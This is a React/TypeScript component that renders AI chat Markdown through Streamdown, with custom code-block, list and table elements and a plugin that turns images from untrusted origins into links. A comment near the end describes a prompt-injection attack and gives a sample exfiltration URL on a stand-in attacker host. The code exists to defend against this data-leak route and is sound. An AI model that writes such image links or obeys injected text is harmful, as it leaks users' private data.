import "./ai-chat-markdown.css";

import { isValidElement, memo, type ComponentPropsWithoutRef, type ReactNode } from "react";
import remarkBreaks from "remark-breaks";
import { defaultRehypePlugins, defaultRemarkPlugins, Streamdown, type Components } from "streamdown";
import { CopyIconButton } from "@/components/copy-icon-button.tsx";
import { cn } from "@/lib/utils.ts";
import type { AppClassName } from "../../lib/dom-utils.ts";

// #region code
type AiChatMarkdownCode_ClassNames = "AiChatMarkdown-inline-code";

function AiChatMarkdownCode(props: ComponentPropsWithoutRef<"code"> & { node?: unknown }) {
	const { className, children, node: _node, ...rest } = props;

	return (
		<code className={cn("AiChatMarkdown-inline-code" satisfies AiChatMarkdownCode_ClassNames, className)} {...rest}>
			{children}
		</code>
	);
}
// #endregion code

// #region pre
type AiChatMarkdownPre_ClassNames =
	| "AiChatMarkdown-code-block"
	| "AiChatMarkdown-code-header"
	| "AiChatMarkdown-code-header-language"
	| "AiChatMarkdown-code-copy-button"
	| "AiChatMarkdown-pre"
	| "AiChatMarkdown-code";

function get_code_text(children: ReactNode): string {
	if (typeof children === "string" || typeof children === "number") {
		return String(children);
	}

	if (Array.isArray(children)) {
		return children.map(get_code_text).join("");
	}

	return "";
}

function get_code_language(className: string | undefined) {
	const match = className?.match(/(?:^|\s)language-(\S+)/);
	return match?.[1] ?? "text";
}

function get_first_child(children: ReactNode) {
	return Array.isArray(children) ? children[0] : children;
}

function AiChatMarkdownPre(props: ComponentPropsWithoutRef<"pre"> & { node?: unknown }) {
	const { className, children, node: _node, ...rest } = props;
	const firstChild = get_first_child(children);
	let codeClassName: string | undefined;
	let code = get_code_text(children);

	if (isValidElement(firstChild)) {
		const childProps = firstChild.props as { className?: string; children?: ReactNode };
		codeClassName = childProps.className;
		code = get_code_text(childProps.children);
	}

	const displayCode = code.endsWith("\n") ? code.slice(0, -1) : code;

	return (
		<div className={"AiChatMarkdown-code-block" satisfies AiChatMarkdownPre_ClassNames}>
			<div className={"AiChatMarkdown-code-header" satisfies AiChatMarkdownPre_ClassNames}>
				<span className={"AiChatMarkdown-code-header-language" satisfies AiChatMarkdownPre_ClassNames}>
					{get_code_language(codeClassName)}
				</span>
				<CopyIconButton
					variant="ghost-highlightable"
					className={"AiChatMarkdown-code-copy-button" satisfies AiChatMarkdownPre_ClassNames}
					text={displayCode}
					tooltipCopy="Copy code"
				/>
			</div>
			<pre
				className={cn(
					"AiChatMarkdown-pre" satisfies AiChatMarkdownPre_ClassNames,
					"app-scrollable" satisfies AppClassName,
					className,
				)}
				{...rest}
			>
				<code className={cn("AiChatMarkdown-code" satisfies AiChatMarkdownPre_ClassNames, codeClassName)}>
					{displayCode}
				</code>
			</pre>
		</div>
	);
}
// #endregion pre

// #region task checkbox
function AiChatMarkdownTaskCheckbox(props: ComponentPropsWithoutRef<"input"> & { node?: unknown }) {
	const { node: _node, ...rest } = props;

	return <input aria-label="Task completion" {...rest} />;
}
// #endregion task checkbox

// #region ul
/**
 * Streamdown's default list components use `list-inside` (list-style-position: inside),
 * which pushes the marker onto its own line when the li starts with a block element
 * (loose list items render as `<li><p>…</p>…</li>`). Render plain ul/ol instead so the
 * `.app-doc` list styles apply with default outside markers.
 */
function AiChatMarkdownUl(props: ComponentPropsWithoutRef<"ul"> & { node?: unknown }) {
	const { className, children, node: _node, ...rest } = props;

	return (
		<ul className={cn("AiChatMarkdown-ul" satisfies AiChatMarkdown_ClassNames, className)} {...rest}>
			{children}
		</ul>
	);
}
// #endregion ul

// #region ol
/**
 * Streamdown's default list components use `list-inside` (list-style-position: inside),
 * which pushes the marker onto its own line when the li starts with a block element
 * (loose list items render as `<li><p>…</p>…</li>`). Render plain ul/ol instead so the
 * `.app-doc` list styles apply with default outside markers.
 */
function AiChatMarkdownOl(props: ComponentPropsWithoutRef<"ol"> & { node?: unknown }) {
	const { className, children, node: _node, ...rest } = props;

	return (
		<ol className={cn("AiChatMarkdown-ol" satisfies AiChatMarkdown_ClassNames, className)} {...rest}>
			{children}
		</ol>
	);
}
// #endregion ol

// #region hr
/**
 * Streamdown's default hr uses Tailwind utility classes. Render a plain hr so the
 * app's component CSS owns the divider style.
 */
function AiChatMarkdownHr(props: ComponentPropsWithoutRef<"hr"> & { node?: unknown }) {
	const { className, node: _node, ...rest } = props;

	return <hr className={cn("AiChatMarkdown-hr" satisfies AiChatMarkdown_ClassNames, className)} {...rest} />;
}
// #endregion hr

// #region table
/**
 * Streamdown's default table components use Tailwind utility classes. Render plain
 * table elements so the app's component CSS owns the table style. Keep a scrollable
 * wrapper so a wide table scrolls inside the chat instead of overflowing it.
 */
function AiChatMarkdownTable(props: ComponentPropsWithoutRef<"table"> & { node?: unknown }) {
	const { className, children, node: _node, ...rest } = props;

	return (
		<div className={"AiChatMarkdown-table-wrapper" satisfies AiChatMarkdown_ClassNames}>
			<table className={cn("AiChatMarkdown-table" satisfies AiChatMarkdown_ClassNames, className)} {...rest}>
				{children}
			</table>
		</div>
	);
}

function AiChatMarkdownThead(props: ComponentPropsWithoutRef<"thead"> & { node?: unknown }) {
	const { className, children, node: _node, ...rest } = props;

	return (
		<thead className={cn("AiChatMarkdown-thead" satisfies AiChatMarkdown_ClassNames, className)} {...rest}>
			{children}
		</thead>
	);
}

function AiChatMarkdownTbody(props: ComponentPropsWithoutRef<"tbody"> & { node?: unknown }) {
	const { className, children, node: _node, ...rest } = props;

	return (
		<tbody className={cn("AiChatMarkdown-tbody" satisfies AiChatMarkdown_ClassNames, className)} {...rest}>
			{children}
		</tbody>
	);
}

function AiChatMarkdownTr(props: ComponentPropsWithoutRef<"tr"> & { node?: unknown }) {
	const { className, children, node: _node, ...rest } = props;

	return (
		<tr className={cn("AiChatMarkdown-tr" satisfies AiChatMarkdown_ClassNames, className)} {...rest}>
			{children}
		</tr>
	);
}

function AiChatMarkdownTh(props: ComponentPropsWithoutRef<"th"> & { node?: unknown }) {
	const { className, children, node: _node, ...rest } = props;

	return (
		<th className={cn("AiChatMarkdown-th" satisfies AiChatMarkdown_ClassNames, className)} {...rest}>
			{children}
		</th>
	);
}

function AiChatMarkdownTd(props: ComponentPropsWithoutRef<"td"> & { node?: unknown }) {
	const { className, children, node: _node, ...rest } = props;

	return (
		<td className={cn("AiChatMarkdown-td" satisfies AiChatMarkdown_ClassNames, className)} {...rest}>
			{children}
		</td>
	);
}
// #endregion table

// #region root
export type AiChatMarkdown_ClassNames =
	| "AiChatMarkdown"
	| "AiChatMarkdown-content"
	| "AiChatMarkdown-h1"
	| "AiChatMarkdown-h2"
	| "AiChatMarkdown-h3"
	| "AiChatMarkdown-h4"
	| "AiChatMarkdown-h5"
	| "AiChatMarkdown-h6"
	| "AiChatMarkdown-p"
	| "AiChatMarkdown-a"
	| "AiChatMarkdown-blockquote"
	| "AiChatMarkdown-ul"
	| "AiChatMarkdown-ol"
	| "AiChatMarkdown-hr"
	| "AiChatMarkdown-table-wrapper"
	| "AiChatMarkdown-table"
	| "AiChatMarkdown-thead"
	| "AiChatMarkdown-tbody"
	| "AiChatMarkdown-th"
	| "AiChatMarkdown-td"
	| "AiChatMarkdown-tr"
	| "AiChatMarkdown-sup";

const ai_chat_markdown_components = {
	// Plain elements let the app CSS own typography without Streamdown's utilities.
	h1: "h1",
	h2: "h2",
	h3: "h3",
	h4: "h4",
	h5: "h5",
	h6: "h6",
	strong: "strong",
	blockquote: "blockquote",
	li: "li",
	input: AiChatMarkdownTaskCheckbox,
	code: AiChatMarkdownCode,
	pre: AiChatMarkdownPre,
	ul: AiChatMarkdownUl,
	ol: AiChatMarkdownOl,
	hr: AiChatMarkdownHr,
	table: AiChatMarkdownTable,
	thead: AiChatMarkdownThead,
	tbody: AiChatMarkdownTbody,
	tr: AiChatMarkdownTr,
	th: AiChatMarkdownTh,
	td: AiChatMarkdownTd,
} satisfies Components;

/**
 * Only these origins may load images in chat Markdown: the app and the R2 host that serves
 * Press media. Chat text can repeat web pages, search results, or tool output, so injected text
 * can make the model write `![x](https://evil.example/?d=<private data>)`. The browser would load
 * that image at once and send the data, with no click and no approval.
 */
const trusted_image_origins = new Set([
	window.location.origin,
	`https://${import.meta.env.VITE_R2_FILES_DOWNLOAD_HOST as string}`,
]);

/**
 * The part of a hast node that `rehype_untrusted_images_to_links` reads.
 * The app does not depend on `@types/hast`.
 */
type AiChatMarkdownHastNode = {
	type: string;
	tagName?: string;
	properties?: Record<string, unknown>;
	children?: AiChatMarkdownHastNode[];
	value?: string;
};

/**
 * Run this after Streamdown's `harden` step. Harden already removed unsafe protocols, so every
 * image `src` here is a valid URL. Harden cannot turn an image into a link, so this step does it.
 */
function rehype_untrusted_images_to_links() {
	const visit = (node: AiChatMarkdownHastNode, isInsideLink: boolean) => {
		node.children = node.children?.flatMap((child) => {
			if (child.type !== "element") {
				return [child];
			}

			// Drop `<source>`. Its `srcset` also loads an image, and harden does not check it.
			if (child.tagName === "source") {
				return [];
			}

			if (child.tagName === "img") {
				const src = String(child.properties?.src);
				if (trusted_image_origins.has(new URL(src, window.location.origin).origin)) {
					return [child];
				}

				// Show the image as a link, so Streamdown still asks before it opens the URL.
				// A link cannot hold another link, so inside a link keep only the text.
				const text = { type: "text", value: String(child.properties?.alt || src) };
				return isInsideLink ? [text] : [{ type: "element", tagName: "a", properties: { href: src }, children: [text] }];
			}

			visit(child, isInsideLink || child.tagName === "a");
			return [child];
		});
	};

	return (tree: AiChatMarkdownHastNode) => visit(tree, false);
}

export type AiChatMarkdown_Props = {
	className?: string;
	contentClassName?: string;
	markdown: string;
};

export const AiChatMarkdown = memo(function AiChatMarkdown(props: AiChatMarkdown_Props) {
	const { markdown, className, contentClassName } = props;

	// remark-breaks renders soft line breaks as <br> like chat UIs do, since
	// model output relies on single newlines for line separation.
	const remarkPlugins = [...Object.values(defaultRemarkPlugins), remarkBreaks];
	const rehypePlugins = [...Object.values(defaultRehypePlugins), rehype_untrusted_images_to_links];

	return (
		<div
			className={cn("AiChatMarkdown" satisfies AiChatMarkdown_ClassNames, "app-doc" satisfies AppClassName, className)}
		>
			<Streamdown
				mode="static"
				// Undo the wrapper's utility margins so component CSS controls block spacing.
				className={cn(
					"AiChatMarkdown-content" satisfies AiChatMarkdown_ClassNames,
					"[&>*]:[margin-block:revert-layer]",
					contentClassName,
				)}
				remarkPlugins={remarkPlugins}
				rehypePlugins={rehypePlugins}
				components={ai_chat_markdown_components}
			>
				{markdown}
			</Streamdown>
		</div>
	);
});

// #endregion root
